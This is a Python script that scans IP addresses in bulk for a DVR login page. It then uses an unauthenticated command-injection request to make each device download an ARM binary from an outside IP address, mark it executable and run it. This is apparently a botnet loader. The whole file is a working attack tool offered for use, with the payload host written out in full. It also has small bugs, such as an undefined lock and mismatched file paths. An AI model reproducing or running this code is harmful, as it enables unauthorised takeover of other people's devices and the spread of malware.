import requests
import concurrent.futures
import sys
import time

# Define global counters
total_ips_processed = 0
ips_with_zenci = 0

# Define the HTTP headers for the requests
headers = {
    "User-Agent": "curl/7.74.0",
    "Accept": "*/*",
    "Cookie": "uid=1",
}

# Reuse a session to improve performance by reusing connections
session = requests.Session()
session.headers.update(headers)

# Read the port from command-line arguments
target_port = sys.argv[1]

# Function to create an HTTP GET request using `requests` Session
def send_http_request(ip, port, path):
    url = f"http://{ip}:{port}{path}"
    try:
        response = session.get(url, timeout=1)  # Timeout is kept short for faster failure handling
        return response.text
    except requests.RequestException:
        return None

# Function to execute the exploit for a given IP
def load_bot(target_ip):
    global total_ips_processed, ips_with_zenci

    # Step 1: Send an initial request to check for "Location: /login.rsp"
    login_check_path = "/login.rsp"
    response_text = send_http_request(target_ip, target_port, login_check_path)

    # Check if "Location: /login.rsp" is in the response
    if response_text and 'login.rsp' in response_text:
        print(f"Location: /login.rsp found for {target_ip}, proceeding with exploit...")

        # Define the commands in the correct order
        commands = [
            "wget+http://174.138.41.150/main_arm7+-O+/tmp/a",  # First command (wget)
            "chmod+777+/tmp/a",                            # Second command (chmod)
            "/var/tmp/./a+dvr"                             # Third command (run the script)
        ]

        # Send a request for each command
        for i, command in enumerate(commands):
            exploit_path = f"/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc={command}"
            response_text = send_http_request(target_ip, target_port, exploit_path)

            print(f"Sent command: {command} to {target_ip}")

            # If it's the last command, check if "zenci" is in the response
            if i == len(commands) - 1:
                if response_text and 'zenci' in response_text:
                    print(f"TRUE + {target_ip}")
                    with counter_lock:
                        ips_with_zenci += 1
                else:
                    pass
#                    print(f"Command executed, but 'zenci' not found in response for {target_ip}.")
    else:
        pass  # If "Location: /login.rsp" not found, skip the IP

    # Increment the processed IPs counter
    with counter_lock:
        total_ips_processed += 1

# Function to handle errors and run load_bot
def worker(target_ip):
    try:
        load_bot(target_ip)
    except Exception as e:
        pass

# Function to display the status every second
def display_status():
    while True:
        with counter_lock:
            print(f"Total IPs Processed: {total_ips_processed}, IPs with 'zenci': {ips_with_zenci}")
        time.sleep(1)

# Main function to process all IPs using ThreadPoolExecutor
def main():
    # Use ThreadPoolExecutor to manage threads efficiently
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        # Submit tasks for each IP read from stdin
        futures = [executor.submit(worker, ip.strip()) for ip in sys.stdin if ip.strip()]

        # Wait for all tasks to complete
        concurrent.futures.wait(futures)

    # Since the main threads are done, print the final count
    print(f"Final Count - Total IPs Processed: {total_ips_processed}, IPs with 'zenci': {ips_with_zenci}")

# Entry point
if __name__ == "__main__":
    # Run the main function
    main()
